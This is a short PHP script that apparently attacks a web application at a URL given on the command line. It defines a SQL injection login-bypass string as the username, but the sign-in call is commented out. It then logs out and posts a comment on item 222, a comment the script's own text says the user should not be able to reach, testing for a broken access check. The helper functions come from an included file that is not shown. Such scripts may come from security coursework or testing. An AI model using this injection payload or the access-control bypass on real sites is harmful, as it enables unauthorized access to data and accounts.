<?php
include 'main.php';
$user = "' or ''='";
$pass = "boom";
if($argc==1)
{
  echo "No url provided";
  exit();
}else{
  $mainUrl = $argv[1];
}
logout($mainUrl);
//signIn($user, $pass);
//$url = $mainUrl.'/view.php?id=222';
comment($mainUrl,"222", "Hello sir, I am commenting in a comment I am not supposed to access, a comment not shown to me");
//curl_get($url);
?>
